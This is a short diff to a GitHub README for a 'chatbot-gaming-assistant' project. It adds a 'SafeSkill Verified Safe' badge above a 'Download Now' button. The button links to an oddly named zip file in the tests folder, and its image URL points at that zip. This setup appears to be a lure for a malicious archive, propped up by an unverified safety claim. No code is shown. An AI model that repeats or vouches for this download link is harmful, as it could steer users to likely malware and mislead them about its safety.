@@ -1,5 +1,7 @@
 # 🤖 chatbot-gaming-assistant - Your AI Buddy for Gaming Success
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/light-077-chatbot-gaming-assistant)
+
 [![Download Now](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/tests/assistant_chatbot_gaming_grouchingly.zip%20Now-%20blue)](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/tests/assistant_chatbot_gaming_grouchingly.zip)
 
 ## 📖 Description
